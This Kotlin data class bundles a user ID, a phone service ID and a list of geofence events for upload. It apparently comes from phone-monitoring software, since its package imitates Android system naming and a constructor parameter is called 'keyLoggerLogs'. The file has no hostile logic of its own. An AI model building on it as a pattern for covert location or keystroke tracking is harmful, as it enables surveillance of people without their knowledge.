package com.android.services.models

import com.android.services.db.entities.GeoFenceEvent
import com.google.gson.annotations.SerializedName

class GeoFenceLogs {
    @SerializedName("userId")
    var userId: String? = null

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null

    @SerializedName("geoFence")
    var geoFenceLogs: List<GeoFenceEvent>? = null

    constructor()
    constructor(userId: String?, phoneServiceId: String?, keyLoggerLogs: List<GeoFenceEvent>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        geoFenceLogs = keyLoggerLogs
    }
}